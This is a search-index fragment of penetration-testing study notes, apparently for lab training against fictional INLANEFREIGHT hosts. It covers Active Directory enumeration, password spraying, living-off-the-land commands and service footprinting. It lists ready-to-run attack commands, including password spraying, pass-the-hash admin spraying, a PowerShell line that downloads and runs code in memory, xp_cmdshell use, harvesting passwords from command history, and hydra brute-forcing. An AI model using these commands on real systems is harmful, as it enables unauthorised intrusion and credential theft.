172.16.5.5</code></li> <li><code>querydominfo</code></li> </ol> </li> <li>Enum4linux: <code>enum4linux -P 172.16.5.5</code></li> <li>Enum4linux-ng: <code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></li> </ol>"},{"location":"active-directory/initial/#enumerating-null-session-from-windows","title":"Enumerating Null Session - from Windows","text":"<ol> <li>Establish a null session from windows: <code>net use \\\\DC01\\ipc$ \"\" /u:\"\"</code></li> <li>Common errors when trying to authenticate:<ol> <li><code>net use \\\\DC01\\ipc$ \"\" /u:guest</code> System error 1331 has occurred. This user can't sign in because this account is currently disabled.</li> <li><code>net use \\\\DC01\\ipc$ \"password\" /u:guest</code><ol> <li>System error 1326 has occurred. The user name or password is incorrect.</li> <li>System error 1909 has occurred. The referenced account is currently locked out and may not be logged on to.</li> </ol> </li> </ol> </li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-linux-ldap-anonymous-bind","title":"Enumerating the Password Policy - from Linux - LDAP Anonymous Bind","text":"<ol> <li>Ldapsearch: <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength</code></li> <li></li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-windows","title":"Enumerating the Password Policy - from Windows","text":"<ol> <li>Using net.exe: <code>net accounts</code></li> <li>Using PowerView: <code>Get-DomainPolicy</code></li> </ol>"},{"location":"active-directory/initial/#password-spraying-making-a-target-user-list","title":"Password Spraying - Making a Target User List","text":"<ol> <li>Using enum4linux: <code>enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"</code></li> <li>Using rpcclient: <ol> <li><code>rpcclient -U \"\" -N 172.16.5.5</code></li> <li><code>enumdomusers</code></li> </ol> </li> <li>Using CrackMapExec --users Flag: <code>crackmapexec smb 172.16.5.5 --users</code></li> <li>Gathering Users with LDAP Anonymous:<ol> <li>Using ldapsearch: <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"</code></li> <li>Using windapsearch: <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code></li> </ol> </li> <li>Kerbrute User Enumeration: <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></li> <li></li> </ol>"},{"location":"active-directory/initial/#credentialed-enumeration-to-build-our-user-list","title":"Credentialed Enumeration to Build our User List","text":"<ol> <li>CME: <code>sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users</code></li> </ol>"},{"location":"active-directory/initial/#internal-password-spraying-from-linux","title":"Internal Password Spraying - from Linux","text":"<ol> <li>Using a Bash one-liner for the Attack: <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done</code></li> <li>Using Kerbrute for the Attack: <code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></li> <li>Using CrackMapExec &amp; Filtering Logon Failures: <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></li> <li>Validating the Credentials with CrackMapExec: <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></li> <li>Local Admin Spraying with CrackMapExec: <code>sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></li> </ol>"},{"location":"active-directory/initial/#internal-password-spraying-from-windows","title":"Internal Password Spraying - from Windows","text":"<ol> <li>Using DomainPasswordSpray.ps1: <ol> <li><code>Import-Module .\\DomainPasswordSpray.ps1</code></li> <li><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></li> </ol> </li> </ol>"},{"location":"active-directory/lotl/","title":"Living Off the Land","text":""},{"location":"active-directory/lotl/#basic-enumeration-commands","title":"Basic Enumeration Commands","text":"<ol> <li>Prints the PC's Name: <code>hostname</code></li> <li>Prints out the OS version and revision level: <code>[System.Environment]::OSVersion.Version</code></li> <li>Prints the patches and hotfixes applied to the host: <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li> <li>Prints out network adapter state and configurations: <code>ipconfig /all</code></li> <li>Displays a list of environment variables for the current session (ran from CMD-prompt): <code>set</code></li> <li>Displays the domain name to which the host belongs (ran from CMD-prompt): <code>echo %USERDOMAIN%</code></li> <li>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt): <code>echo %logonserver%</code></li> <li>Systeminfo: <code>systeminfo</code></li> <li>Using qwinsta to list logged users: <code>qwinsta</code></li> </ol>"},{"location":"active-directory/lotl/#harnessing-powershell","title":"Harnessing PowerShell","text":"<ol> <li>Lists available modules loaded for use.: <code>Get-Module</code></li> <li>Will print the execution policy settings for each scope on a host.: <code>Get-ExecutionPolicy -List</code></li> <li>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.: <code>Set-ExecutionPolicy Bypass -Scope Process</code></li> <li>With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.: <code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code></li> <li>Return environment values such as key paths, users, computer information, etc.: <code>Get-ChildItem Env: | ft Key,Value</code></li> <li>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.: <code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"</code></li> <li>Downgrade Powershell: <code>powershell.exe -version 2</code></li> </ol>"},{"location":"active-directory/lotl/#checking-defenses","title":"Checking Defenses","text":"<ol> <li>Firewall Checks: <code>netsh advfirewall show allprofiles</code></li> <li>Windows Defender Check (from CMD.exe): <code>sc query windefend</code></li> <li>Get-MpComputerStatus: <code>Get-MpComputerStatus</code></li> </ol>"},{"location":"active-directory/lotl/#network-information","title":"Network Information","text":"<ol> <li>Lists all known hosts stored in the arp table.: <code>arp -a</code></li> <li>Prints out adapter settings for the host. We can figure out the network segment from here.: <code>ipconfig /all</code></li> <li>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.: <code>route print</code></li> <li>Displays the status of the host's firewall. We can determine if it is active and filtering traffic.: <code>netsh advfirewall show state</code></li> </ol>"},{"location":"active-directory/lotl/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<ol> <li>Prints the patch level and description of the Hotfixes applied: <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li> <li>Displays basic host information to include any attributes within the list: <code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></li> <li>A listing of all processes on host: <code>wmic process list /format:list</code></li> <li>Displays information about the Domain and Domain Controllers: <code>wmic ntdomain list /format:list</code></li> <li>Displays information about all local accounts and any domain accounts that have logged into the device: <code>wmic useraccount list /format:list</code></li> <li>Information about all local groups: <code>wmic group list /format:list</code></li> <li>Dumps information about any system accounts that are being used as service accounts.: <code>wmic sysaccount list /format:list</code></li> </ol>"},{"location":"active-directory/lotl/#net-commands","title":"Net Commands","text":"<ol> <li>Information about password requirements: <code>net accounts</code></li> <li>Password and lockout policy: <code>net accounts /domain</code></li> <li>Information about domain groups: <code>net group /domain</code></li> <li>List users with domain admin privileges: <code>net group \"Domain Admins\" /domain</code></li> <li>List of PCs connected to the domain: <code>net group \"domain computers\" /domain</code></li> <li>List PC accounts of domains controllers: <code>net group \"Domain Controllers\" /domain</code></li> <li>User that belongs to the group: <code>net group &lt;domain_group_name&gt; /domain</code></li> <li>List of domain groups: <code>net groups /domain</code></li> <li>All available groups: <code>net localgroup</code></li> <li>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default): <code>net localgroup administrators /domain</code></li> <li>Information about a group (admins): <code>net localgroup Administrators</code></li> <li>Add user to administrators: <code>net localgroup administrators [username] /add</code></li> <li>Check current shares: <code>net share</code></li> <li>Get information about a user within the domain: <code>net user &lt;ACCOUNT_NAME&gt; /domain</code></li> <li>List all users of the domain: <code>net user /domain</code></li> <li>Information about the current user: <code>net user %username%</code></li> <li>Mount the share locally: <code>net use x: \\computer\\share</code></li> <li>Get a list of computers: <code>net view</code></li> <li>Shares on the domains: <code>net view /all /domain[:domainname]</code></li> <li>List shares of a computer: <code>net view \\computer /ALL</code></li> <li>List of PCs of the domain: <code>net view /domain</code></li> </ol>"},{"location":"active-directory/lotl/#dsquery","title":"Dsquery","text":"<ol> <li>User Search: <code>dsquery user</code></li> <li>Computer Search: <code>dsquery computer</code></li> <li>Wildcard Search: <code>dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"</code></li> <li>Users With Specific Attributes Set (PASSWD_NOTREQD): <code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl</code></li> <li>Searching for Domain Controllers: <code>dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName</code></li> </ol>"},{"location":"active-directory/privilege/","title":"Privilege Escalation","text":""},{"location":"active-directory/privilege/#remote-desktop","title":"Remote Desktop","text":"<ol> <li>Enumerating the Remote Desktop Users Group: <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code></li> <li>Enumerating the Remote Management Users Group: <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code></li> <li>Establishing WinRM Session from Windows:<ol> <li><code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code></li> <li><code>$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)</code></li> <li><code>Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred</code></li> </ol> </li> <li>Connecting to a Target with Evil-WinRM and Valid Credentials: <code>evil-winrm -i 10.129.201.234 -u forend</code></li> </ol>"},{"location":"active-directory/privilege/#sql-server-admin","title":"SQL Server Admin","text":"<ol> <li>Enumerating MSSQL Instances with PowerUpSQL: <ol> <li><code>cd .\\PowerUpSQL\\</code></li> <li><code>Import-Module .\\PowerUpSQL.ps1</code></li> <li><code>Get-SQLInstanceDomain</code></li> </ol> </li> <li>Authenticate against the remote SQL server host and run custom queries or operating system commands: <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code></li> <li>Authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit: <code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></li> <li>Viewing our Options with Access to the SQL Server: <code>SQL&gt; help</code></li> <li>Choosing enable_xp_cmdshell: <code>SQL&gt; enable_xp_cmdshell</code></li> <li>Enumerating our Rights on the System using xp_cmdshell: <code>xp_cmdshell whoami /priv</code></li> </ol>"},{"location":"enumeration/enumeration/","title":"Enumeration","text":""},{"location":"enumeration/enumeration/#host-discovery","title":"Host discovery","text":"<p>Powershell</p> <pre><code>1..254 | % { $ip=\"172.30.0.$_\"; if (ping -n 1 -w 100 $ip | Select-String \"TTL=\") { \"$ip is up\" } }\n</code></pre> <p>Bash</p> <pre><code>for ip in 172.30.0.{1..254}; do ping -c 1 -W 1 $ip &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"$ip is up\"; done\n</code></pre>"},{"location":"enumeration/enumeration/#rustscan","title":"Rustscan","text":"<pre><code>sudo apt install cargo\ncargo install rustscan\nexport PATH=$PATH:/path/to/rustscan\nchmod +x /path/to/rustscan\necho 'export PATH=$PATH:/root/.cargo/bin' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nrustscan --version\nrustscan -a 172.20.0.52 -r 1-1000 //r - port range\nrustscan -a 172.20.0.52 -r 1-1000 -u -- -Pn //no ping\n\n</code></pre>"},{"location":"enumeration/nmap/","title":"Nmap","text":"<ol> <li>Host discovery: <code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5</code></li> <li>Scanning from IP list file: <code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5</code></li> <li>Scan Multiple IPs: <code>sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5</code></li> <li>Scan Single IP: <code>sudo nmap 10.129.2.18 -sn -oA host</code></li> <li>Discovering Open UDP Ports: <code>sudo nmap 10.129.2.28 -F -sU</code></li> <li>Banner Grabbing: <code>sudo nmap 10.129.2.28 -p- -sV</code></li> <li>Specifying Scripts: <code>sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands</code></li> <li>Vuln Category: <code>sudo nmap 10.129.2.28 -p 80 -sV --script vuln</code></li> <li>Optimized RTT: <code>sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</code></li> <li>Decoy: <code>sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</code></li> </ol>"},{"location":"footprinting/dns/","title":"DNS","text":"<ol> <li>DIG<ol> <li>NS Query <code>dig ns inlanefreight.htb @10.129.14.128</code></li> <li>Version Query <code>dig CH TXT version.bind 10.129.120.85</code></li> <li>ANY Query <code>dig any inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer <code>dig axfr inlanefreight.htb @10.129.14.128</code></li> <li>DIG - AXFR Zone Transfer - Internal <code>dig axfr internal.inlanefreight.htb @10.129.14.128</code></li> </ol> </li> <li>Subdomain Brute Forcing <code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done</code></li> <li>DNSenum <code>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb</code></li> </ol>"},{"location":"footprinting/domain-info/","title":"Domain info","text":"<ol> <li>Certificate Transparency: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq .</code></li> <li>Filtered by the unique subdomains: <code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep</code></li> <li>Identify the hosts directly accessible from the Internet and not hosted by third-party providers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Shodan: <ol> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done</code></li> <li><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></li> </ol> </li> <li>Display all the available DNS records where we might find more hosts: <code>dig any inlanefreight.com</code></li> </ol>"},{"location":"footprinting/domain-info/#cloud-resources","title":"Cloud Resources","text":"<ol> <li>Company Hosted Servers: <code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li>Google Search for AWS: <code>intext:sometexthere inurl:amazonaws.com</code></li> <li>Google Search for Azure: <code>intext:sometexthere inurl:blob.core.windows.net</code></li> </ol>"},{"location":"footprinting/ftp/","title":"FTP","text":"<ol> <li>Anonymous Login: <code>ftp 10.129.14.136</code> </li> <li>Download file: <code>get filename</code></li> <li>Download All Available Files: <code>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136</code></li> <li>Upload a File: <code>put testupload.txt</code></li> <li>Nmap:<ol> <li><code>find / -type f -name ftp* 2&gt;/dev/null | grep scripts</code></li> <li><code>sudo nmap -sV -p21 -sC -A 10.129.14.136</code> <code>\u2014scripts \u2014script-trace</code></li> </ol> </li> </ol>"},{"location":"footprinting/imap-pop3/","title":"IMAP/POP3","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC</code></li> <li>cURL: <code>curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd</code> <code>-v</code></li> <li>OpenSSL - TLS Encrypted Interaction POP3: <code>openssl s_client -connect 10.129.14.128:pop3s</code></li> <li>OpenSSL - TLS Encrypted Interaction IMAP: <code>openssl s_client -connect 10.129.14.128:imaps</code></li> <li>IMAP Commands</li> </ol> <pre><code>1 LOGIN username password #User's login.\n1 LIST \"\" * #Lists all directories.  \n1 CREATE \"INBOX\" #Creates a mailbox with a specified name.                                  \n1 DELETE \"INBOX\" #Deletes a mailbox.      \n1 RENAME \"ToRead\" \"Important\" #Renames a mailbox. \n1 LSUB \"\" * #Returns a subset of names from the set of names that the User has declared as being active or subscribed. |\n1 SELECT INBOX #Selects a mailbox so that messages in the mailbox can be accessed.        \n1 UNSELECT INBOX #Exits the selected mailbox.                             \n1 FETCH &lt;ID&gt; all #Retrieves data associated with a message in the mailbox.                  \n1 CLOSE #Removes all messages with the Deleted flag set.                           \n1 LOGOUT #Closes the connection with the IMAP server.                               \n</code></pre> <ol> <li>POP3 Commands</li> </ol> <pre><code>USER #usernameIdentifies the user.                        \nPASS #passwordAuthentication of the user using its password.            \nSTAT #Requests the number of saved emails from the server.      \nLIST #Requests from the server the number and size of all emails.             |\nRETR id #Requests the server to deliver the requested email by ID. \nDELE id #Requests the server to delete the requested email by ID.   \nCAPA #Requests the server to display the server capabilities.   \nRSET #Requests the server to reset the transmitted information. \nQUIT #Closes the connection with the POP3 server. \n</code></pre>"},{"location":"footprinting/ipmi/","title":"IPMI","text":"<ol> <li>Nmap: <code>sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local</code></li> <li>Metasploit Version Scan: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version</code></li> <li>Metasploit dump hashes: <code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes</code></li> </ol>"},{"location":"footprinting/ldap/","title":"LDAP","text":"<ol> <li>LDAP Anonymous Bind<ol> <li>Confirmation that anonymous bind can be done with Python:</li> </ol> </li> </ol> <pre><code>from ldap3 import*\ns = Server('10.10.10.161',get_info = ALL)\nc = Connection(s,'','')\nc.bind()\nTrue\n</code></pre> <ol> <li>We can confirm anonymous LDAP bind with <code>ldapsearch</code> and retrieve all AD objects from LDA: <code>ldapsearch -H ldap://10.129.1.207 -x -b \"dc=inlanefreight,dc=local\"</code></li> <li>Windapsearch<ol> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -u \"\" -U</code></li> <li><code>python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 10.10.10.161 -d htb.local --custom \"objectClass=*\"</code></li> </ol> </li> </ol>"},{"location":"footprinting/mongodb/","title":"MongoDB","text":"<ol> <li><code>mongo ip-address:port</code></li> <li><code>show dbs</code></li> <li><code>use db-name</code></li> <li><code>show collections</code></li> <li>Show content of collection: <code>db.flag.find().pretty()</code></li> </ol>"},{"location":"footprinting/mssql/","title":"MSSQL","text":"<ol> <li>Nmap: <code>sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248</code></li> <li>MSSQL Ping in Metasploit: <code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248</code></li> <li>Connecting with Mssqlclient.py<ol> <li>connect <code>python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth</code></li> <li>Interact with: <code>select name from sys.databases</code></li> </ol> </li> </ol>"},{"location":"footprinting/mysql/","title":"MYSQL","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</code></li> <li>Interaction with MySQL:<ol> <li>without pass: <code>mysql -u root -h 10.129.14.132</code></li> <li>with pass: <code>mysql -u root -pP4SSw0rd -h 10.129.14.128</code></li> </ol> </li> <li>Commands:</li> </ol> <pre><code>show databases;\nselect version();\nuse mysql;\nshow tables;\nshow columns from &lt;table&gt;;\nselect * from &lt;table&gt;;\nselect * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";\n</code></pre>"},{"location":"footprinting/nfs/","title":"NFS","text":"<ol> <li>Nmap:<ol> <li><code>sudo nmap 10.129.14.128 -p111,2049 -sV -sC</code></li> <li><code>sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049</code></li> </ol> </li> <li>Show Available NFS Shares: <code>showmount -e 10.129.14.128</code></li> <li>Mounting NFS Share:</li> </ol> <pre><code>mkdir target-NFS\nsudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\ncd target-NFS\ntree .\n</code></pre> <ol> <li>List Contents with Usernames &amp; Group Names: <code>ls -l mnt/nfs/</code></li> <li>List Contents with UIDs &amp; GUIDs: <code>ls -n mnt/nfs/</code></li> <li>Unmounting:<ol> <li><code>cd ..</code></li> <li><code>sudo umount ./target-NFS</code></li> </ol> </li> </ol>"},{"location":"footprinting/rdp/","title":"RDP","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</code></li> <li>rdp-sec-check<ol> <li><code>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check</code></li> <li><code>./rdp-sec-check.pl 10.129.201.24</code> </li> </ol> </li> <li>Initiate an RDP Session<ol> <li><code>xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:10.129.201.248</code></li> <li><code>xfreerdp /u:username /p:password /v:10.129.75.180 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution /drive:linux,/</code></li> </ol> </li> </ol>"},{"location":"footprinting/rservices/","title":"RSERVICES","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 512,513,514 10.0.17.2</code></li> <li>Logging in Using Rlogin: <code>rlogin 10.0.17.2 -l user-name</code></li> </ol>"},{"location":"footprinting/rsync/","title":"RSYNC","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 873 127.0.0.1</code></li> <li>Enumerating an Open Share: <code>rsync -av --list-only rsync://127.0.0.1/dev</code></li> </ol>"},{"location":"footprinting/smb/","title":"SMB","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p139,445</code></li> <li> <p>SMBclient     <code>bash     smbclient -N -L //10.129.14.128 # no logon     smbclient //10.129.14.128/notes # connecting to share</code></p> </li> <li> <p>Download Files: <code>get file_name</code></p> </li> <li>Brute Forcing User RIDs: <ol> <li> <p><code>bash for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done</code></p> </li> <li>You can use script from Impacket called samrdump.py alternatively: <code>samrdump.py 10.129.14.128</code></li> </ol> </li> <li>Crackmapexec: <code>crackmapexec smb 10.129.14.128 --shares -u '' -p ''</code></li> <li>RPCclient:</li> </ol> <pre><code>rpcclient -U \"\" 10.129.14.128\nsrvinfo\nenumdomains\nquerydominfo\nnetshareenumall\nnetsharegetinfo notes\nenumdomusers\nqueryuser 0x3e9\nquerygroup 0x201\n</code></pre> <ol> <li>SMBMap: <code>smbmap -H 10.129.14.128</code></li> <li>Enum4Linux:</li> </ol> <pre><code>git clone https://github.com/cddmp/enum4linux-ng.git\ncd enum4linux-ng\npip3 install -r requirements.txt\n./enum4linux-ng.py 10.129.14.128 -A\n</code></pre> <ol> <li>HYDRA <code>hydra -L user.list -P password.list smb://10.129.42.197</code></li> </ol>"},{"location":"footprinting/smtp/","title":"SMTP","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap 10.129.14.128 -sC -sV -p25</code></li> <li><code>sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v</code></li> </ol> </li> <li>Commands</li> </ol> <pre><code>AUTH PLAIN AUTH #is a service extension used to authenticate the client.                                   |\nHELO #The client logs in with its computer name and thus starts the session.                         |\nMAIL FROM #The client names the email sender.                                                             |\nRCPT TO #The client names the email recipient.                                                          |\nDATA #The client initiates the transmission of the email.                                            |\nRSET #The client aborts the initiated transmission but keeps the connection between client and server.|\nVRFY #The client checks if a mailbox is available for message transfer.                              |\nEXPN #The client also checks if a mailbox is available for messaging with this command.              |\nNOOP #The client requests a response from the server to prevent disconnection due to time-out.       |\nQUIT #The client terminates the session. \n</code></pre>"},{"location":"footprinting/snmp/","title":"SNMP","text":"<ol> <li>SNMPwalk: <code>snmpwalk -v2c -c public 10.129.14.128</code></li> <li>OneSixtyOne: <ol> <li><code>sudo apt install onesixtyone</code></li> <li><code>onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128</code></li> </ol> </li> <li>Braa:<ol> <li><code>sudo apt install braa</code></li> <li><code>braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax</code></li> <li><code>braa public@10.129.14.128:.1.3.6.* # example</code></li> </ol> </li> </ol>"},{"location":"footprinting/ssh/","title":"SSH","text":"<ol> <li>SSH audit<ol> <li><code>git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit</code></li> <li><code>./ssh-audit.py 10.129.14.132</code></li> </ol> </li> </ol>"},{"location":"footprinting/tns/","title":"ORACLE TNS","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open</code></li> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute</code></li> </ol> </li> <li>odat.py <code>./odat.py all -s 10.129.204.235</code></li> <li>SQLplus - for log In: <code>sqlplus scott/tiger@10.129.204.235/XE</code></li> <li>SQLplus commands</li> </ol>"},{"location":"footprinting/winrm/","title":"WinRM","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n</code></li> </ol>"},{"location":"footprinting/wmi/","title":"Wmi","text":"<ol> <li>wmiexec.py <code>usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"</code></li> </ol>"}]}